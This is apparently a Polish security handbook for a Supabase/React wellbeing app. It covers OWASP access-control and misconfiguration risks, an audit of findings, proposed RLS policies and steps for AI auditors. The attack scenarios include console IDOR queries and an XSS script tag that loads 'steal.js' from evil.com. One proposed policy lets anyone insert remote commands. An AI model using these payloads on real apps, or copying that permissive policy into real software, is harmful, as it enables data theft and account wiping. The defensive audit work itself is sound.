# 🔒 Księga Bezpieczeństwa — Wellbeing App

> **Cel dokumentu:** Referencja bezpieczeństwa dla deweloperów i agentów AI audytujących ten projekt.  
> **Standard:** OWASP Top 10 — 2025  
> **Ostatnia aktualizacja:** 2026-07-13 (A02:2025 dodane)  

---

## Spis treści

1. [A01:2025 — Broken Access Control](#a012025--broken-access-control)
   - [Opis zagrożenia](#opis-zagrożenia)
   - [Warianty zagrożeń (CWE)](#warianty-zagrożeń-cwe)
   - [Scenariusze ataków specyficzne dla tego projektu](#scenariusze-ataków-specyficzne-dla-tego-projektu)
   - [Wymagania ochrony — checklist](#wymagania-ochrony--checklist)
2. [A02:2025 — Security Misconfiguration](#a022025--security-misconfiguration)
   - [Opis zagrożenia](#opis-zagrożenia-a02)
   - [Warianty zagrożeń (CWE)](#warianty-zagrożeń-cwe-a02)
   - [Scenariusze ataków specyficzne dla tego projektu](#scenariusze-ataków-a02)
   - [Wymagania ochrony — checklist](#wymagania-ochrony--checklist-a02)
3. [Audyt projektu Wellbeing App](#audyt-projektu-wellbeing-app)
   - [Znalezione podatności A01](#znalezione-podatności)
   - [Znalezione podatności A02](#znalezione-podatności-a02)
   - [Zastosowane poprawki](#zastosowane-poprawki)
   - [Rekomendacje do wdrożenia w Supabase Dashboard](#rekomendacje-do-wdrożenia-w-supabase-dashboard)
4. [Instrukcja audytu dla agentów AI](#instrukcja-audytu-dla-agentów-ai)

---

## A01:2025 — Broken Access Control

### Opis zagrożenia

Broken Access Control (Złamana Kontrola Dostępu) to **najczęściej występujące zagrożenie** w aplikacjach webowych (100% testowanych aplikacji wykazuje jakąś formę tego problemu). Polega na tym, że użytkownik może wykonać akcję **poza swoimi uprawnieniami** — odczytać, zmodyfikować lub usunąć dane innego użytkownika.

**Statystyki OWASP 2025:**

| Metryka | Wartość |
|---------|---------|
| Zmapowane CWE | 40 |
| Maks. współczynnik występowania | 20.15% |
| Średni współczynnik występowania | 3.74% |
| Łączna liczba wystąpień | 1,839,701 |
| Łączna liczba CVE | 32,654 |

### Warianty zagrożeń (CWE)

Poniżej lista wariantów CWE zmapowanych do A01:2025, z opisem ryzyka i **checklistą audytu** dla każdego wariantu. Warianty oznaczone ⚠️ są **bezpośrednio istotne** dla architektury Supabase+React tego projektu.

---

#### ⚠️ CWE-284: Improper Access Control (Nieprawidłowa kontrola dostępu)
- **Opis:** Ogólna kategoria — brak mechanizmów weryfikujących, czy użytkownik ma prawo do żądanej operacji.
- **Ryzyko dla tego projektu:** Zapytania do Supabase filtrowane tylko po stronie klienta (`.eq('user_email', user.email)`) mogą zostać ominięte, jeśli nie ma RLS na tabelach.
- **Checklist audytu:**
  - [ ] Czy tabele `tasks`, `moods`, `profiles` mają włączony RLS?
  - [ ] Czy polityki RLS wymuszają `auth.email() = user_email`?
  - [ ] Czy filtry `.eq(...)` są **redundantne** wobec RLS (defense-in-depth)?

#### ⚠️ CWE-862: Missing Authorization (Brak autoryzacji)
- **Opis:** Brak sprawdzenia, czy zalogowany użytkownik jest właścicielem zasobu, który modyfikuje.
- **Ryzyko dla tego projektu:** Operacje `update`/`delete` na `tasks` używają `.eq('id', id)` **bez dodatkowego filtra `user_email`**. Atakujący znający ID zadania innego użytkownika mógłby je zmodyfikować lub usunąć.
- **Checklist audytu:**
  - [ ] Czy każdy `UPDATE` i `DELETE` na `tasks` zawiera `.eq('user_email', user.email)`?
  - [ ] Czy każdy `UPDATE` na `moods` zawiera `.eq('user_email', user.email)`?
  - [ ] Czy RLS wymusza te warunki na poziomie bazy?

#### ⚠️ CWE-639: Authorization Bypass Through User-Controlled Key (Obejście autoryzacji przez klucz kontrolowany przez użytkownika)
- **Opis:** Atakujący podaje ID (klucz) zasobu innego użytkownika, aby uzyskać do niego dostęp.
- **Ryzyko:** Insecure Direct Object Reference (IDOR) — wszystkie operacje w `App.jsx` przyjmują `id` zadania/nastroju bezpośrednio z frontendu i wysyłają je do Supabase bez weryfikacji własności.
- **Checklist audytu:**
  - [ ] Czy operacje `toggleTask(id)`, `deleteTask(id)`, `returnToBacklog(id)` weryfikują, że `id` należy do bieżącego użytkownika?
  - [ ] Czy operacja `handleSaveTask` przy edycji weryfikuje własność?

#### ⚠️ CWE-566: Authorization Bypass Through User-Controlled SQL Primary Key
- **Opis:** Podkategoria CWE-639. Użytkownik kontroluje klucz główny w zapytaniu SQL.
- **Ryzyko:** Identyczne jak CWE-639 — klucz `id` w `.eq('id', id)` jest kontrolowany przez kod klienta.

#### ⚠️ CWE-285: Improper Authorization (Nieprawidłowa autoryzacja)
- **Opis:** Logika autoryzacji zawiera błędy, które pozwalają na nieautoryzowany dostęp.
- **Ryzyko:** Lista `ADMIN_EMAILS` jest zakodowana w kliencie JavaScript. Atakujący może odczytać ten email ze źródła strony. Kontrola admina odbywa się **wyłącznie po stronie frontendu**.
- **Checklist audytu:**
  - [ ] Czy admin nie ma dodatkowych uprawnień w bazie danych wynikających wyłącznie z frontendu?
  - [ ] Czy `AdminPanel.jsx` nie wykonuje operacji, które zwykły użytkownik nie mógłby wykonać za pomocą bezpośrednich zapytań API?

#### ⚠️ CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- **Opis:** Ujawnienie wrażliwych informacji nieautoryzowanemu użytkownikowi.
- **Ryzyko:**
  - `AdminPanel.jsx` pobiera `supabase.from('profiles').select('email')` — listę **wszystkich** emaili użytkowników. Bez RLS dowolny zalogowany użytkownik może to zrobić.
  - Obiekt `user` (z emailem, preferencjami) jest przechowywany w `localStorage` pod kluczem `wba_user` jako plaintext JSON.
- **Checklist audytu:**
  - [ ] Czy tabela `profiles` ma RLS blokujący `SELECT` na rekordy innych użytkowników?
  - [ ] Czy `AdminPanel` operuje na tabeli z odpowiednimi politykami?
  - [ ] Czy wrażliwe dane w `localStorage` są minimalne?

#### ⚠️ CWE-922: Insecure Storage of Sensitive Information
- **Opis:** Przechowywanie wrażliwych danych w niebezpieczny sposób.
- **Ryzyko:** `usePersist` hook zapisuje cały obiekt `user` (email, imię, preferencje) w `localStorage`. Token sesji Supabase jest również w `localStorage` (to jest domyślne zachowanie `supabase-js`).
- **Uwaga:** W kontekście SPA z Supabase jest to akceptowalny kompromis, ale `user` object w localStorage nie powinien zawierać danych wykraczających poza to, co jest niezbędne do nawigacji przed załadowaniem sesji.

#### CWE-352: Cross-Site Request Forgery (CSRF)
- **Opis:** Atakujący zmusza przeglądarkę ofiary do wykonania niechcianej akcji.
- **Ryzyko:** Niskie. Supabase Auth używa tokenów Bearer w nagłówkach (nie cookies), co naturalnie chroni przed CSRF.
- **Checklist audytu:**
  - [ ] Czy Supabase SDK wysyła tokeny w nagłówkach `Authorization`, a nie w cookies?

#### CWE-425: Direct Request / Forced Browsing
- **Opis:** Bezpośredni dostęp do stron/zasobów przez zgadywanie URL.
- **Ryzyko:** Niskie w SPA (Single Page Application). Wszystkie widoki są renderowane warunkowo w `App.jsx` na podstawie stanu `user` i `view`. Nie ma oddzielnych URL-i do "force-browse".

#### CWE-540: Inclusion of Sensitive Information in Source Code
- **Opis:** Wrażliwe dane w kodzie źródłowym.
- **Ryzyko:**
  - `ADMIN_EMAILS` jest zaszyty w kodzie JavaScript dostarczanym do przeglądarki.
  - Klucz `VITE_SUPABASE_ANON_KEY` jest celowo publiczny (to klucz anonimowy, nie `service_role`).
- **Checklist audytu:**
  - [ ] Czy w kodzie źródłowym nie ma klucza `service_role` Supabase?
  - [ ] Czy `.env` jest w `.gitignore`?

#### CWE-276: Incorrect Default Permissions
- **Opis:** Domyślne uprawnienia są zbyt szerokie.
- **Ryzyko:** Tabele Supabase **bez RLS** domyślnie pozwalają na pełny CRUD dla każdego posiadacza klucza `anon`. To jest **krytyczne zagrożenie** dopóki RLS nie jest włączony.
- **Checklist audytu:**
  - [ ] Czy w Supabase Dashboard każda tabela ma włączony RLS?
  - [ ] Czy są zdefiniowane polityki SELECT/INSERT/UPDATE/DELETE?

#### CWE-863: Incorrect Authorization
- **Opis:** Logika autoryzacji jest błędna lub niekompletna.
- **Ryzyko:** Jeśli polityki RLS będą błędnie sformułowane (np. `true` zamiast `auth.email() = user_email`), zagrożenie pozostanie.

#### CWE-601: URL Redirection to Untrusted Site (Open Redirect)
- **Opis:** Przekierowanie na niezaufaną stronę.
- **Ryzyko:** W `signInWithOtp` używane jest `emailRedirectTo: window.location.origin`. To jest bezpieczne, ale należy upewnić się, że Supabase Dashboard ma skonfigurowane **dozwolone adresy przekierowań**.
- **Checklist audytu:**
  - [ ] Czy w Supabase Dashboard → Authentication → URL Configuration → Redirect URLs są ograniczone do zaufanych domen?

#### CWE-918: Server-Side Request Forgery (SSRF)
- **Opis:** Atakujący zmusza serwer do wykonania żądania do niezamierzonego zasobu.
- **Ryzyko:** Minimalne. Aplikacja nie ma własnego backendu — komunikuje się bezpośrednio z Supabase API.

---

### Scenariusze ataków specyficzne dla tego projektu

#### Scenariusz 1: IDOR — Usunięcie zadania innego użytkownika
```
Atakujący zna (lub zgaduje) ID zadania innego użytkownika.
Wykonuje z konsoli przeglądarki:

  await supabase.from('tasks').delete().eq('id', 12345);

BEZ RLS: Supabase wykona polecenie — zadanie innego użytkownika zostaje usunięte.
Z RLS (policy: user_email = auth.email()): Supabase zwraca 0 rows affected.
```

#### Scenariusz 2: Odczyt wszystkich emaili
```
Dowolny zalogowany użytkownik wykonuje:

  const { data } = await supabase.from('profiles').select('email');

BEZ RLS: Otrzymuje listę WSZYSTKICH zarejestrowanych emaili.
Z RLS (policy: email = auth.email()): Otrzymuje tylko swój rekord.
```

#### Scenariusz 3: Modyfikacja preferencji innego użytkownika
```
Atakujący zmienia email w zapytaniu:

  await supabase.from('profiles')
    .update({ prefs: { hours: 1 } })
    .eq('email', 'ofiara@example.com');

BEZ RLS: Preferencje ofiary zostają nadpisane.
Z RLS: Zapytanie jest odrzucane.
```

#### Scenariusz 4: Eskalacja uprawnień do Admina
```
Atakujący rejestruje konto z adresem admin@wellbeing.app.
Jeśli ten adres nie jest zastrzeżony w Supabase Auth:
  - Uzyskuje dostęp do AdminPanel
  - Pobiera listę wszystkich użytkowników
  - Wysyła zdalne komendy (totalWipe, triggerScenario) do dowolnego konta
```

---

### Wymagania ochrony — checklist

#### Poziom 1: Krytyczne (MUST HAVE)

- [ ] **RLS na tabelach `tasks`, `moods`, `profiles`, `remote_commands`**
  - Policy SELECT: `auth.email() = user_email` (lub `email` dla profiles)
  - Policy INSERT: `auth.email() = user_email`
  - Policy UPDATE: `auth.email() = user_email`
  - Policy DELETE: `auth.email() = user_email`

- [ ] **Dodać `.eq('user_email', user.email)` do WSZYSTKICH operacji `update`/`delete` w `App.jsx`** jako defense-in-depth, nawet jeśli RLS jest włączony:
  - `toggleTask(id)` — brakuje filtra `user_email`
  - `deleteTask(id)` — brakuje filtra `user_email`
  - `returnToBacklog(id)` — brakuje filtra `user_email`
  - `handleSaveTask` (edycja) — brakuje filtra `user_email`
  - `generatePlan` (update) — brakuje filtra `user_email`
  - `remote_commands.update` — brakuje filtra `target_email`

#### Poziom 2: Ważne (SHOULD HAVE)

- [ ] **Tabela `remote_commands`** — osobna polityka RLS:
  - INSERT: Tylko admin (`auth.email() IN (lista adminów)` — lub osobna rola)
  - SELECT/UPDATE: `target_email = auth.email()` LUB admin

- [ ] **Ograniczyć `profiles` SELECT** — użytkownik widzi tylko swój rekord.
  - Wyjątek: Admin potrzebuje listy emaili → rozwiązanie: Supabase Edge Function lub RLS z warunkiem admin.

- [ ] **Usunąć ADMIN_EMAILS z kodu klienta** — przenieść sprawdzanie uprawnień admina na backend (np. Supabase custom claim lub osobna tabela `roles`).

#### Poziom 3: Dodatkowe (NICE TO HAVE)

- [ ] **Content Security Policy (CSP)** — dodać nagłówek CSP do `index.html` lub konfiguracji Vercel.
- [ ] **Rate limiting** — Supabase ma wbudowany rate limiting, ale warto skonfigurować limity na poziomie projektu.
- [ ] **Logowanie prób dostępu** — Supabase automatycznie loguje, ale warto włączyć alerty na podejrzaną aktywność.
- [ ] **Minimalizacja danych w `localStorage`** — przechowywać tylko `email` zamiast pełnego obiektu `user`.

---

## Audyt projektu Wellbeing App

### Znalezione podatności

| ID | Poziom | CWE | Lokalizacja | Opis |
|----|--------|-----|-------------|------|
| V-001 | 🔴 KRYTYCZNY | CWE-862 | `App.jsx:681-682` | `toggleTask(id)` — `.eq('id', id)` bez filtra `user_email`. IDOR: dowolny użytkownik może zmienić status zadania innego użytkownika. |
| V-002 | 🔴 KRYTYCZNY | CWE-862 | `App.jsx:848-851` | `deleteTask(id)` — `.eq('id', id)` bez filtra `user_email`. IDOR: możliwe usunięcie cudzego zadania. |
| V-003 | 🔴 KRYTYCZNY | CWE-862 | `App.jsx:628-631` | `returnToBacklog(id)` — `.eq('id', id)` bez filtra `user_email`. |
| V-004 | 🔴 KRYTYCZNY | CWE-862 | `App.jsx:743-746` | `handleSaveTask` (edycja) — `.eq('id', taskToSave.id)` bez filtra `user_email`. |
| V-005 | 🔴 KRYTYCZNY | CWE-862 | `App.jsx:607-610` | `generatePlan` (update loop) — `.eq('id', id)` bez filtra `user_email`. |
| V-006 | 🟠 WYSOKI | CWE-276 | Supabase Dashboard | Tabele prawdopodobnie nie mają włączonego RLS (nie ustawiono podczas migracji). |
| V-007 | 🟠 WYSOKI | CWE-200 | `AdminPanel.jsx:13` | Pobieranie WSZYSTKICH emaili z tabeli `profiles` — bez RLS dowolny użytkownik może odczytać dane. |
| V-008 | 🟡 ŚREDNI | CWE-285 | `App.jsx:34` | `ADMIN_EMAILS` zaszyty w kodzie klienta — kontrola ról tylko w UI. |
| V-009 | 🟡 ŚREDNI | CWE-922 | `usePersist.js` | Cały obiekt `user` z emailem i preferencjami w `localStorage` jako plaintext. |
| V-010 | 🟢 NISKI | CWE-540 | `App.jsx:34` | Admin email widoczny w zbudowanym bundle JS. |

### Zastosowane poprawki

Poprawki V-001 do V-005 zostały wdrożone w kodzie — dodano `.eq('user_email', user.email)` do WSZYSTKICH operacji `update`/`delete` na tabelach `tasks` i `moods`, które wcześniej filtrowały wyłącznie po `id`.

### Rekomendacje do wdrożenia w Supabase Dashboard

#### 1. Włącz RLS na wszystkich tabelach

W **Supabase Dashboard → Table Editor → (nazwa tabeli) → RLS**, włącz Row Level Security i dodaj polityki:

**Tabela `tasks`:**
```sql
-- SELECT: Użytkownik widzi tylko swoje zadania
CREATE POLICY "Users see own tasks" ON tasks
  FOR SELECT USING (auth.email() = user_email);

-- INSERT: Użytkownik może dodawać tylko ze swoim emailem
CREATE POLICY "Users insert own tasks" ON tasks
  FOR INSERT WITH CHECK (auth.email() = user_email);

-- UPDATE: Użytkownik może edytować tylko swoje zadania
CREATE POLICY "Users update own tasks" ON tasks
  FOR UPDATE USING (auth.email() = user_email);

-- DELETE: Użytkownik może usuwać tylko swoje zadania
CREATE POLICY "Users delete own tasks" ON tasks
  FOR DELETE USING (auth.email() = user_email);
```

**Tabela `moods`:**
```sql
CREATE POLICY "Users see own moods" ON moods
  FOR SELECT USING (auth.email() = user_email);

CREATE POLICY "Users insert own moods" ON moods
  FOR INSERT WITH CHECK (auth.email() = user_email);

CREATE POLICY "Users update own moods" ON moods
  FOR UPDATE USING (auth.email() = user_email);

CREATE POLICY "Users delete own moods" ON moods
  FOR DELETE USING (auth.email() = user_email);
```

**Tabela `profiles`:**
```sql
CREATE POLICY "Users see own profile" ON profiles
  FOR SELECT USING (auth.email() = email);

CREATE POLICY "Users insert own profile" ON profiles
  FOR INSERT WITH CHECK (auth.email() = email);

CREATE POLICY "Users update own profile" ON profiles
  FOR UPDATE USING (auth.email() = email);

CREATE POLICY "Users delete own profile" ON profiles
  FOR DELETE USING (auth.email() = email);
```

**Tabela `remote_commands`:**
```sql
-- SELECT: Użytkownik widzi komendy skierowane do siebie
CREATE POLICY "Users see own commands" ON remote_commands
  FOR SELECT USING (auth.email() = target_email);

-- UPDATE: Użytkownik może aktualizować status swoich komend
CREATE POLICY "Users update own commands" ON remote_commands
  FOR UPDATE USING (auth.email() = target_email);

-- INSERT: Tylko admin może wstawiać komendy
-- UWAGA: Wymaga custom claim lub service_role key
-- Tymczasowe rozwiązanie: zaufanie do anon key + kontrola w aplikacji
CREATE POLICY "Anyone can insert commands" ON remote_commands
  FOR INSERT WITH CHECK (true);
```

#### 2. Ogranicz Redirect URLs

W **Supabase Dashboard → Authentication → URL Configuration**:
- Site URL: `https://twoja-domena.vercel.app`
- Redirect URLs: Dodaj TYLKO zaufane domeny

#### 3. Rozważ przeniesienie logiki admina

Przyszłe usprawnienie: Zamiast `ADMIN_EMAILS` w kliencie, użyj **Supabase Custom Claims** lub tabeli `roles`:
```sql
CREATE TABLE roles (
  user_email TEXT PRIMARY KEY REFERENCES auth.users(email),
  role TEXT NOT NULL DEFAULT 'user' CHECK (role IN ('user', 'admin'))
);
```

---

## Instrukcja audytu dla agentów AI

### Jak przeprowadzić audyt A01:2025 w tym projekcie

Gdy zostaniesz poproszony o sprawdzenie bezpieczeństwa tego projektu pod kątem Broken Access Control, wykonaj następujące kroki:

#### Krok 1: Weryfikacja RLS
```
Sprawdź w Supabase Dashboard (lub zapytaj użytkownika), czy tabele 
tasks, moods, profiles, remote_commands mają włączony RLS.
```

#### Krok 2: Wyszukaj operacje CRUD bez filtra własności
```bash
# Szukaj .eq('id', ...) BEZ towarzyszącego .eq('user_email', ...)
grep -n "\.eq('id'" src/App.jsx

# Dla każdego znalezionego wyniku, sprawdź czy w tym samym bloku 
# jest RÓWNIEŻ .eq('user_email', user.email)
```

#### Krok 3: Wyszukaj wycieki danych
```bash
# Szukaj zapytań SELECT bez filtra użytkownika
grep -n "\.select(" src/**/*.jsx
grep -n "\.from(" src/**/*.jsx

# Każdy SELECT powinien mieć .eq('user_email', ...) lub .eq('email', ...)
# WYJĄTEK: Jeśli RLS jest włączony i poprawnie skonfigurowany
```

#### Krok 4: Wyszukaj dane wrażliwe w kodzie
```bash
# Szukaj zaszyfrowanych sekretów, kluczy, emaili admina
grep -rn "ADMIN" src/
grep -rn "service_role" src/
grep -rn "secret" src/
```

#### Krok 5: Sprawdź localStorage
```bash
# Szukaj danych zapisywanych do localStorage
grep -rn "localStorage" src/

# Oceń, czy zapisywane dane są minimalne i nie zawierają 
# wrażliwych informacji wykraczających poza potrzeby UX
```

#### Krok 6: Raport
Wyniki audytu powinny być przedstawione w formacie tabeli z kolumnami:
- ID podatności
- Poziom zagrożenia (KRYTYCZNY/WYSOKI/ŚREDNI/NISKI)
- CWE
- Lokalizacja (plik:linia)
- Opis
- Status (NAPRAWIONY / DO NAPRAWIENIA / AKCEPTOWALNY)

---

## A02:2025 — Security Misconfiguration

### Opis zagrożenia {#opis-zagrożenia-a02}

Security Misconfiguration (Błędna Konfiguracja Bezpieczeństwa) to zagrożenie polegające na **nieprawidłowym skonfigurowaniu** systemu, aplikacji lub usługi chmurowej z perspektywy bezpieczeństwa. Awansowało z pozycji #5 w poprzedniej edycji — **100% testowanych aplikacji** wykazuje jakąś formę błędnej konfiguracji.

**Statystyki OWASP 2025:**

| Metryka | Wartość |
|---------|---------|
| Zmapowane CWE | 16 |
| Maks. współczynnik występowania | 27.70% |
| Średni współczynnik występowania | 3.00% |
| Średni ważony exploit | 7.96 |
| Średni ważony impact | 3.97 |
| Łączna liczba wystąpień | 719,084 |
| Łączna liczba CVE | 1,375 |

**Aplikacja może być podatna, gdy:**
- Brakuje odpowiedniego hardeningu na dowolnym poziomie stosu aplikacji
- Niepotrzebne funkcje są włączone (np. debug tools, testowe konta, zbędne porty/serwisy)
- Domyślne konta i hasła są nadal aktywne i niezmienione
- Obsługa błędów ujawnia stack trace'y lub zbyt szczegółowe informacje
- Serwer nie wysyła nagłówków bezpieczeństwa lub nie są ustawione na bezpieczne wartości
- Konfiguracja bezpieczeństwa w serwerach/frameworkach/bibliotekach nie jest ustawiona na bezpieczne wartości

### Warianty zagrożeń (CWE) {#warianty-zagrożeń-cwe-a02}

Poniżej lista wariantów CWE zmapowanych do A02:2025, z opisem ryzyka dla architektury Vite+React+Supabase tego projektu. Warianty oznaczone ⚠️ są **bezpośrednio istotne**.

---

#### ⚠️ CWE-16: Configuration (Konfiguracja)
- **Opis:** Ogólna kategoria — problemy wynikające z nieprawidłowej konfiguracji oprogramowania.
- **Ryzyko dla tego projektu:**
  - `index.html` nie zawierał nagłówka Content Security Policy (CSP) — brak ochrony przed XSS.
  - `index.html` miał `lang="en"` zamiast `lang="pl"` i generyczny tytuł "React App" — nie wpływa na bezpieczeństwo, ale ułatwia fingerprinting.
  - Brak `vercel.json` z nagłówkami bezpieczeństwa — serwer produkcyjny nie wysyłał `X-Frame-Options`, `Strict-Transport-Security`, `Permissions-Policy`.
  - `vite.config.js` nie miał wyłączonych source maps w produkcji — pełny kod źródłowy dostępny przez DevTools.
- **Status:** ✅ NAPRAWIONE

#### ⚠️ CWE-489: Active Debug Code (Aktywny kod debugowy)
- **Opis:** Kod debugowy pozostawiony w produkcji.
- **Ryzyko dla tego projektu:**
  - Panel Debug (`DebugModal.jsx`) jest dostępny dla **każdego** zalogowanego użytkownika za pomocą skrótu `Shift+D`.
  - Pozwala na: generowanie sztucznych nastrojów, usuwanie zadań, podróż w czasie, totalny reset konta.
  - `console.log('[RemoteCommand] Received:', ...)` w `App.jsx:376` loguje dane zdalnych komend do konsoli przeglądarki.
  - 19 wystąpień `console.error(err)` w kodzie produkcyjnym — obiekty błędów Supabase (z informacjami o schemacie bazy) są widoczne w DevTools.
- **Checklist audytu:**
  - [ ] Czy DebugModal jest dostępny tylko dla admina lub w trybie developerskim?
  - [ ] Czy `console.log`/`console.error` w produkcji jest zastąpiony przez logger, który nie ujawnia stacktrace'ów?

#### ⚠️ CWE-547: Use of Hard-coded, Security-relevant Constants (Użycie zakodowanych na stałe stałych istotnych dla bezpieczeństwa)
- **Opis:** Stałe istotne dla bezpieczeństwa (hasła, klucze, emaile adminów) zakodowane bezpośrednio w kodzie źródłowym.
- **Ryzyko dla tego projektu:**
  - `ADMIN_EMAILS = ["admin@wellbeing.app"]` w `App.jsx:34` — lista adminów w kliencie JavaScript, widoczna po zbudowaniu bundle'a.
  - Email admina `admin@wellbeing.app` jest również zakodowany w politykach RLS bazy danych.
- **Status:** ⚠️ AKCEPTOWALNY (w kontekście badawczym) / DO NAPRAWIENIA (w produkcji)

#### ⚠️ CWE-200: Exposure of Sensitive Information (Ujawnienie wrażliwych informacji) — powiązanie z obsługą błędów
- **Opis:** Komunikaty błędów ujawniają wewnętrzną strukturę systemu.
- **Ryzyko dla tego projektu:**
  - `AuthView.jsx` wyświetlał `err.message` z Supabase bezpośrednio w UI — ujawniając np. nazwy tabel, limity rate, wewnętrzne kody błędów.
  - `AdminPanel.jsx` wyświetlał `error.message` w toastach — ujawniając strukturę zapytań.
- **Status:** ✅ NAPRAWIONE — zastąpiono generycznymi komunikatami

#### ⚠️ CWE-260: Password in Configuration File (Hasło w pliku konfiguracyjnym) / CWE-526: Exposure Through Environmental Variables
- **Opis:** Wrażliwe dane w plikach konfiguracyjnych dostępnych w repozytorium.
- **Ryzyko dla tego projektu:**
  - Plik `.env` z kluczami Supabase **NIE BYŁ** w `.gitignore`! Tylko warianty `.env.local`, `.env.development.local` były ignorowane.
  - Oznacza to, że klucz `VITE_SUPABASE_ANON_KEY` mógł zostać wypchnięty do publicznego repozytorium Git.
- **Status:** ✅ NAPRAWIONE — `.env` dodane do `.gitignore`

#### CWE-315: Cleartext Storage of Sensitive Information in a Cookie
- **Opis:** Wrażliwe dane przechowywane w cookies w postaci jawnej.
- **Ryzyko:** Niskie. Supabase JS SDK przechowuje tokeny w `localStorage`, nie w cookies. Nie dotyczy bezpośrednio.

#### CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute / CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag
- **Opis:** Cookies bez flag bezpieczeństwa.
- **Ryzyko:** Niskie. Aplikacja nie ustawia własnych cookies. Supabase Auth używa `localStorage` + nagłówków `Authorization`.

#### CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- **Opis:** Zbyt liberalna polityka cross-domain.
- **Ryzyko:** Średnie. Bez nagłówka `X-Frame-Options: DENY` aplikacja mogła być osadzana w iframe na obcych domenach (clickjacking).
- **Status:** ✅ NAPRAWIONE — dodano `X-Frame-Options: DENY` w `vercel.json` i `frame-ancestors 'none'` w CSP.

#### CWE-611: Improper Restriction of XML External Entity Reference (XXE)
- **Opis:** Ataki XXE na parsery XML.
- **Ryzyko:** Nie dotyczy. Aplikacja nie przetwarza XML.

---

### Scenariusze ataków specyficzne dla tego projektu {#scenariusze-ataków-a02}

#### Scenariusz 1: Dostęp do panelu debugowego
```
Dowolny zalogowany użytkownik naciska Shift+D.
Otwiera się DebugModal z pełnymi uprawnieniami:
  - Może wygenerować sztuczne nastroje
  - Może usunąć wszystkie swoje zadania
  - Może podróżować w czasie (oszukać zegar aplikacji)
  - Może wykonać "Totalną czystkę" konta

Sam w sobie nie jest to atak na innych użytkowników (RLS chroni dane),
ale pozwala na manipulację własnych danych badawczych.
```

#### Scenariusz 2: Source map disclosure
```
BEZ FIX-u:
  Atakujący otwiera DevTools → Sources → webpack://
  Widzi pełny kod źródłowy aplikacji, w tym:
  - ADMIN_EMAILS = ["admin@wellbeing.app"]
  - Logikę debugActions (totalWipe, triggerScenario)
  - Strukturę zapytań Supabase
  - Nazwy tabel i kolumn bazy danych

PO FIX-ie (sourcemap: false w vite.config.js):
  Sources zawiera tylko zminifikowany kod — analiza jest znacznie trudniejsza.
```

#### Scenariusz 3: Brak Content Security Policy
```
BEZ CSP:
  Atakujący wstrzykuje złośliwy skrypt (np. przez XSS w polu notatki):
  <script src="https://evil.com/steal.js"></script>
  Przeglądarka wykonuje skrypt bez ograniczeń.

Z CSP (script-src 'self'):
  Przeglądarka blokuje skrypt z obcej domeny.
  Konsola wyświetla: "Refused to load the script 'https://evil.com/...'..."
```

#### Scenariusz 4: .env w repozytorium Git
```
BEZ FIX-u:
  Deweloper wykonuje: git add . && git commit && git push
  Plik .env z kluczem VITE_SUPABASE_ANON_KEY trafia do publicznego repo.
  Bot skanujący GitHub (np. TruffleHog, GitGuardian) wykrywa klucz.
  Atakujący używa klucza do bezpośrednich zapytań do Supabase API.

PO FIX-ie (.env w .gitignore):
  git add . pomija plik .env — klucze nie trafiają do repozytorium.
```

---

### Wymagania ochrony — checklist {#wymagania-ochrony--checklist-a02}

#### Poziom 1: Krytyczne (MUST HAVE)

- [x] **Content Security Policy (CSP)** — nagłówek CSP w `index.html` (meta) oraz `vercel.json` (serwer)
  - `script-src 'self'` — blokuje inline scripts i zewnętrzne skrypty
  - `connect-src 'self' https://*.supabase.co wss://*.supabase.co` — ogranicza połączenia sieciowe
  - `frame-ancestors 'none'` — zapobiega clickjacking

- [x] **`.env` w `.gitignore`** — zapobiega wyciekowi kluczy Supabase do repozytorium

- [x] **Generyczne komunikaty błędów w UI** — `AuthView.jsx` i `AdminPanel.jsx` nie ujawniają `err.message` z Supabase

- [x] **Source maps wyłączone w produkcji** — `vite.config.js: sourcemap: false`

#### Poziom 2: Ważne (SHOULD HAVE)

- [x] **Nagłówki bezpieczeństwa HTTP** (via `vercel.json`):
  - `X-Content-Type-Options: nosniff`
  - `X-Frame-Options: DENY`
  - `X-XSS-Protection: 1; mode=block`
  - `Strict-Transport-Security: max-age=63072000`
  - `Referrer-Policy: strict-origin-when-cross-origin`
  - `Permissions-Policy: camera=(), microphone=(), geolocation=()`

- [x] **Metadane HTML** — poprawny `lang="pl"`, opisowy `<title>`, `<meta description>`

#### Poziom 3: Dodatkowe (NICE TO HAVE)

- [ ] **Ograniczyć DebugModal** — dostępny tylko w trybie deweloperskim (`import.meta.env.DEV`) lub tylko dla admina.
- [ ] **Usunąć `console.error(err)` z produkcji** — zastąpić centralnym loggerem, który nie ujawnia stack trace'ów w DevTools użytkownika.
- [ ] **Supabase: włączyć Leaked Password Protection** — wykryte przez Supabase Security Advisor.
- [ ] **Rotacja klucza `anon key`** — jeśli `.env` był kiedykolwiek w publicznym repo Git, klucz powinien zostać zregenerowany.

---

## Audyt A02:2025 — Znalezione podatności {#znalezione-podatności-a02}

| ID | Poziom | CWE | Lokalizacja | Opis | Status |
|----|--------|-----|-------------|------|--------|
| V-011 | 🟠 WYSOKI | CWE-16 | `index.html` | Brak nagłówka Content Security Policy (CSP) — aplikacja podatna na XSS. | ✅ NAPRAWIONY |
| V-012 | 🟠 WYSOKI | CWE-260 | `.gitignore` | Plik `.env` z kluczami Supabase NIE BYŁ ignorowany przez Git — ryzyko wycieku do publicznego repo. | ✅ NAPRAWIONY |
| V-013 | 🟠 WYSOKI | CWE-16 | `vite.config.js` | Source maps nie były wyłączone w produkcji — pełny kod źródłowy dostępny przez DevTools. | ✅ NAPRAWIONY |
| V-014 | 🟡 ŚREDNI | CWE-200 | `AuthView.jsx:37,67` | Surowy `err.message` z Supabase wyświetlany użytkownikowi — ujawnia wewnętrzne szczegóły. | ✅ NAPRAWIONY |
| V-015 | 🟡 ŚREDNI | CWE-200 | `AdminPanel.jsx:16,39` | `error.message` z Supabase w toastach — ujawnia strukturę zapytań. | ✅ NAPRAWIONY |
| V-016 | 🟡 ŚREDNI | CWE-16 | Brak pliku | Brak `vercel.json` — serwer produkcyjny nie wysyłał nagłówków bezpieczeństwa (HSTS, X-Frame-Options, etc.). | ✅ NAPRAWIONY |
| V-017 | 🟡 ŚREDNI | CWE-489 | `App.jsx:418-435` | Panel Debug (Shift+D) dostępny dla każdego zalogowanego użytkownika, nie tylko w trybie dev. | ⚠️ DO NAPRAWIENIA |
